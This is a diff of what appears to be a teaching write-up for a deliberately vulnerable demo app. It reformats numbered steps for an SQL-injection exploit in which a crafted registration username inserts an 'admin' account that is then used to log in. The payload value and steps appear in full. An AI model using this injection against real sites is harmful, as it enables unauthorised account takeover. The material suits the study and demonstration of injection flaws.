@@ -11,11 +11,17 @@ in an SQL query, so that if I create a user with username 'test"),(1,"admin was 
 Exploit
 -------
 1. Register an account with the following data:
-   Username: test"),("admin","admin was hacked
-   Password: test
-   Confirm Password: test
-   Real Name: Ms SQL Hacker
-   Blab Name: SQL Hacker
+   
+   - Username: `test"),("admin","admin was hacked`
+   
+   - Password: `test`
+   
+   - Confirm Password: `test`
+   
+   - Real Name: `Ms SQL Hacker`
+   
+   - Blab Name: `SQL Hacker`
+
 2. Ignore the 500 error.
 3. Login with admin/admin.
 4. Go to Blabbers
